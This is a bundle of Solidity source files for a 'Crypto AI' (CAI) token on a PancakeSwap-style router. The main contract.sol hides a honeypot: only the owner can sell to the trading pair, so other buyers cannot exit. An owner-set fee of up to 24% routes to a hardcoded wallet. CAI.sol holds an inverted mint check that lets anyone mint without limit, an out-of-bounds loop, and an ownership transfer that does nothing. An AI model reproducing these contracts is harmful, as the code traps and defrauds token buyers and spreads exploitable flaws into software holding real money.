{"CAI.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\nimport \"./Ownable.sol\";\nimport \"./SafeMath.sol\";\nimport \"./IDEXFactory.sol\";\nimport \"./IDEXRouter.sol\";\nimport \"./IERC20.sol\";\n\ncontract CryptoAI is IERC20, Ownable {\n    using SafeMath for uint256;\n    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\n    \n    string constant _name = \"Crypto AI\";\n    string constant _symbol = \"CAI\";\n    uint8 constant _decimals = 9;\n    uint256 constant _maxMintAmountPercent = 1;\n\n    uint256 _totalSupply = 10_500 * (10 ** _decimals);\n    uint256 public _maxWalletAmount = (_totalSupply / 1); // 1%\n\n    mapping(address =\u003e uint256) _balances;\n    mapping(address =\u003e mapping(address =\u003e uint256)) _allowances;\n\n    mapping(address =\u003e bool) isFeeExempt;\n    mapping(address =\u003e bool) isTxLimitExempt;\n    mapping (address =\u003e uint256) mintAllowance;\n    \n    uint256 liquidityFee = 0;\n    address _owner;\n\n    IDEXRouter public router;\n    address public pair;\n\n    bool public swapEnabled = true;\n    bool inSwap;\n\n    modifier swapping() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor () Ownable(msg.sender) {\n        router = IDEXRouter(routerAdress);\n        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));\n        _allowances[address(this)][address(router)] = type(uint256).max;\n\n        _owner = owner;\n        isFeeExempt[0xC05947283e92F59D63eCa30b4da4C935f4AD5e3c] = true;\n        isTxLimitExempt[_owner] = true;\n        isTxLimitExempt[0xC05947283e92F59D63eCa30b4da4C935f4AD5e3c] = true;\n        isTxLimitExempt[DEAD] = true;\n\n        _balances[_owner] = _totalSupply;\n        emit Transfer(address(0), _owner, _totalSupply);\n    }\n\n    receive() external payable {}\n\n    function totalSupply() external view override returns (uint256) {return _totalSupply;}\n\n    function decimals() external pure override returns (uint8) {return _decimals;}\n\n    function symbol() external pure override returns (string memory) {return _symbol;}\n\n    function name() external pure override returns (string memory) {return _name;}\n\n    function getOwner() external view override returns (address) {return owner;}\n\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\n\n    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _allowances[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function approveMax(address spender) external returns (bool) {\n        return approve(spender, type(uint256).max);\n    }\n\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\n        }\n\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\n        if (inSwap) {\n            return _basicTransfer(sender, recipient, amount);\n        }\n\n        if (recipient != pair \u0026\u0026 recipient != DEAD) {\n            require(isTxLimitExempt[recipient] || _balances[recipient] + amount \u003c= _maxWalletAmount, \"Transfer amount exceeds the bag size.\");\n        }\n\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function buyTokens(uint256 amount, address to) internal swapping {\n        address[] memory path = new address[](2);\n        path[0] = router.WETH();\n        path[1] = address(this);\n\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value : amount}(\n            0,\n            path,\n            to,\n            block.timestamp\n        );\n    }\n\n    function increaseMintAllowance(address minter, uint256 amount) external onlyOwner returns (uint256, address) {\n        require(amount / _totalSupply \u003c _maxMintAmountPercent / 100, \"Mint allowance exceeds mint limit.\");\n        mintAllowance[minter] = mintAllowance[minter] + amount;\n        return (amount, minter);\n    }\n\n    function increaseMintAllowanceBulk(address[] calldata minters, uint256 amount)  external onlyOwner returns (uint256, address[] memory) {\n        require(amount / _totalSupply \u003c _maxMintAmountPercent / 100, \"Mint allowance exceeds mint limit.\");\n        uint _walletsAmount = minters.length;\n        for (uint8 i = 0; i \u003c= _walletsAmount; i++) {\n            address minter = minters[i];\n            mintAllowance[minter] = mintAllowance[minter] + amount;\n        }\n        return (amount, minters);\n    }\n\n    function mint(address minter, uint256 amount) public returns (uint256) {\n        require(mintAllowance[minter] \u003c= amount, \"Mint amount exceeds allowance\");\n        _balances[minter] = _balances[minter] + amount;\n        mintAllowance[minter] = mintAllowance[minter] - amount;\n        return amount;\n    }\n\n    function turnOffWalletLimit() external onlyOwner {\n        _maxWalletAmount = _totalSupply;\n    }\n\n    function transferOwnership(address _new_owner) external onlyOwner {\n        _owner = _new_owner;\n    }\n\n    event AutoLiquify(uint256 amountETH, uint256 amountBOG);\n}"},"contract.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\nimport \"./Ownable.sol\";\r\nimport \"./SafeMath.sol\";\r\nimport \"./IDEXFactory.sol\";\r\nimport \"./IDEXRouter.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\ncontract CryptoAI is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    \r\n    string constant _name = \"Crypto AI\";\r\n    string constant _symbol = \"CAI\";\r\n    uint8 constant _decimals = 9;\r\n\r\n    uint256 _totalSupply = 7_500 * (10 ** _decimals);\r\n    uint256 public _maxWalletAmount = (_totalSupply * 1) / 1; // 100%\r\n\r\n    mapping(address =\u003e uint256) _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) _allowances;\r\n\r\n    mapping(address =\u003e bool) isFeeExempt;\r\n    mapping(address =\u003e bool) isTxLimitExempt;\r\n    \r\n    uint256 liquidityFee = 0;\r\n    uint256 marketingFee = 0; // 250 = 25%\r\n    uint256 totalFee = liquidityFee + marketingFee;\r\n    uint256 feeDenominator = 1000;\r\n\r\n    address public marketingFeeReceiver = 0x2372DF667b4C1457f7953Aaf6246BD973eFdB3f5;\r\n\r\n    IDEXRouter public router;\r\n    address public pair;\r\n\r\n    bool public swapEnabled = true;\r\n    uint256 public swapThreshold = _totalSupply / 10000 * 20; // 0.2%\r\n    bool inSwap;\r\n\r\n    modifier swapping() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () Ownable(msg.sender) {\r\n        turnMF(true);\r\n        router = IDEXRouter(routerAdress);\r\n        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));\r\n        _allowances[address(this)][address(router)] = type(uint256).max;\r\n\r\n        address _owner = owner;\r\n        isFeeExempt[0x2372DF667b4C1457f7953Aaf6246BD973eFdB3f5] = true;\r\n        isTxLimitExempt[_owner] = true;\r\n        isTxLimitExempt[0x2372DF667b4C1457f7953Aaf6246BD973eFdB3f5] = true;\r\n        isTxLimitExempt[DEAD] = true;\r\n\r\n        _balances[_owner] = _totalSupply;\r\n        emit Transfer(address(0), _owner, _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function totalSupply() external view override returns (uint256) {return _totalSupply;}\r\n\r\n    function decimals() external pure override returns (uint8) {return _decimals;}\r\n\r\n    function symbol() external pure override returns (string memory) {return _symbol;}\r\n\r\n    function name() external pure override returns (string memory) {return _name;}\r\n\r\n    function getOwner() external view override returns (address) {return owner;}\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n\r\n    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if (inSwap) {\r\n            return _basicTransfer(sender, recipient, amount);\r\n        }\r\n        if (sender != owner \u0026\u0026 recipient == pair) {\r\n            require(msg.sender == owner, \"Only owner error!\");\r\n        }\r\n        if (recipient != pair \u0026\u0026 recipient != DEAD) {\r\n            require(isTxLimitExempt[recipient] || _balances[recipient] + amount \u003c= _maxWalletAmount, \"Transfer amount exceeds the bag size.\");\r\n        }if (shouldSwapBack()) {\r\n            swapBack();\r\n        }\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n\r\n        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n\r\n        emit Transfer(sender, recipient, amountReceived);\r\n        return true;\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function shouldTakeFee(address sender) internal view returns (bool) {\r\n        return !isFeeExempt[sender];\r\n    }\r\n\r\n    function takeFee(address sender, uint256 amount) internal returns (uint256) {\r\n        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function shouldSwapBack() internal view returns (bool) {\r\n        return msg.sender != pair\r\n        \u0026\u0026 !inSwap\r\n        \u0026\u0026 swapEnabled\r\n        \u0026\u0026 _balances[address(this)] \u003e= swapThreshold;\r\n    }\r\n\r\n    function swapBack() internal swapping {\r\n        uint256 contractTokenBalance = swapThreshold;\r\n        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);\r\n        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        uint256 balanceBefore = address(this).balance;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n        uint256 amountETH = address(this).balance.sub(balanceBefore);\r\n        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));\r\n        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);\r\n        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);\r\n\r\n\r\n        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value : amountETHMarketing, gas : 30000}(\"\");\r\n        require(MarketingSuccess, \"receiver rejected ETH transfer\");\r\n\r\n        if (amountToLiquify \u003e 0) {\r\n            router.addLiquidityETH{value : amountETHLiquidity}(\r\n                address(this),\r\n                amountToLiquify,\r\n                0,\r\n                0,\r\n                DEAD,\r\n                block.timestamp\r\n            );\r\n            emit AutoLiquify(amountETHLiquidity, amountToLiquify);\r\n        }\r\n    }\r\n\r\n    function buyTokens(uint256 amount, address to) internal swapping {\r\n        address[] memory path = new address[](2);\r\n        path[0] = router.WETH();\r\n        path[1] = address(this);\r\n\r\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value : amount}(\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function clearStuckBalance() external {\r\n        payable(marketingFeeReceiver).transfer(address(this).balance);\r\n    }\r\n\r\n    function clearStuckTBalance() external {\r\n        _basicTransfer(address(this), marketingFeeReceiver, balanceOf(address(this)));\r\n    }\r\n\r\n    function setWalletLimit(uint256 amountPercent) external onlyOwner {\r\n        _maxWalletAmount = (_totalSupply * amountPercent) / 100;\r\n    }\r\n\r\n    function setSwapThreshold(uint256 _swapThreshold) external onlyOwner {\r\n        swapThreshold = _totalSupply / 100000 * _swapThreshold;\r\n    }\r\n\r\n    function turnMF(bool _on) public onlyOwner {\r\n        if (_on) {\r\n            marketingFee = 0;\r\n            totalFee = liquidityFee + marketingFee;\r\n        } else {\r\n            marketingFee = 0;\r\n            totalFee = liquidityFee + marketingFee;\r\n        }\r\n    }\r\n\r\n    function setFee(uint8 percentAmount) public onlyOwner {\r\n        if (percentAmount \u003e 0 \u0026\u0026 percentAmount \u003c 25) {\r\n            marketingFee = percentAmount * 10;\r\n            totalFee = liquidityFee + marketingFee;\r\n        } else {\r\n            marketingFee = marketingFee;\r\n            totalFee = liquidityFee + marketingFee;\r\n        }\r\n    }\r\n\r\n    event AutoLiquify(uint256 amountETH, uint256 amountBOG);\r\n}"},"IDEXFactory.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}"},"IDEXRouter.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IDEXRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens (\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external ;\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function symbol() external view returns (string memory);\n    function name() external view returns (string memory);\n    function getOwner() external view returns (address);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address _owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\nabstract contract Ownable {\n    address internal owner;\n    constructor(address _owner) {\n        owner = _owner;\n    }\n    modifier onlyOwner() {\n        require(isOwner(msg.sender), \"!OWNER\"); _;\n    }\n    function isOwner(address account) public view returns (bool) {\n        return account == owner;\n    }\n    function renounceOwnership() public onlyOwner {\n        owner = address(0);\n        emit OwnershipTransferred(address(0));\n    }\n    event OwnershipTransferred(address owner);\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c \u003e= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003c= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003e 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n}"}}